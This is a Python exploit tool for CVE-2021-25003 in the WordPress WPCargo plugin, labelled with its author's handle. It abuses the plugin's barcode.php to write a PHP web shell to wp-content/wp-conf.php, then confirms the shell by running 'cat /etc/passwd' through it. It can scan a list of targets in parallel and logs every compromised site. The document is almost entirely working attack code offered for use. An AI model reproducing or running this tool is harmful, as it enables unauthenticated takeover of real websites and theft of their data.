# @author : biulove0x
# @name   : WP Plugins WPCargo Exploiter

## This is a magic string that when treated as pixels and compressed using the png
## algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
## payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'
## def encode_character_code(c: int):
##     return '{:08b}'.format(c).replace('0', 'x')
## text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

# References : https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a

from urllib3.exceptions import InsecureRequestWarning
import concurrent.futures
import requests, re, argparse

print(
'''
############################################
# @author : biulove0x                      #
# @name   : WP Plugins WPCargo Exploiter   #
# @cve    : CVE-2021-25003                 #
############################################
''')

def wpcargo(_target, _timeout=5):
    _payload  = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
    _endpoint = 'wp-content/plugins/wpcargo/includes/barcode.php?text='+ _payload +'&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php'
    _sessionget = requests.Session()
    _headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }
    def save_result(_result):
        _saved = open('RESULT-WPCRGO.txt', 'a+')
        _saved.write(_result + '\n')
    
    try:
        _sessionget.get(url=_target + _endpoint, headers=_headers, allow_redirects=True, timeout=_timeout)
        _validationshell = _sessionget.post(url=_target + 'wp-content/wp-conf.php?1=system', headers=_headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=_timeout)
        
        if 'root:x:0:0:root' in _validationshell.text:
            print('[-] ' + _target + 'wp-content/wp-conf.php => Uploaded!')
            save_result(_target + 'wp-content/wp-conf.php?1=system')
        else:
            print('[+] ' + _target + ' Not found!')
    except:
        print('[%] ' + _target + ' Requests failed')

def main(_choose, _target):
    if _choose == 1:
        wpcargo(_target)

    elif _choose == 2:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            _ur_list = open(_target, 'r').read().split()
            _futures = []

            for _url in _ur_list:
                _futures.append(executor.submit(wpcargo, _target=_url))

            for _future in concurrent.futures.as_completed(_futures):
                if(_future.result() is not None):
                    print(_future.result())
    else:
        exit()
        
## SSL Bypass
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

## Setup args
_parser = argparse.ArgumentParser(description='CVE-2021-25003 [ WPCargo < 6.9.0 - Unauthenticated RCE ]')
_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')
_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')
_args = _parser.parse_args()

## Variable args
_singleTarget = _args.t
_multiTarget  = _args.l

if __name__ == '__main__':
    if not _singleTarget == None:
        _choose = 1
        main(_choose, _singleTarget)
    elif not _multiTarget == None:
        _choose = 2
        main(_choose, _multiTarget)
    else:
        print('WpCargo.py --help for using tools')
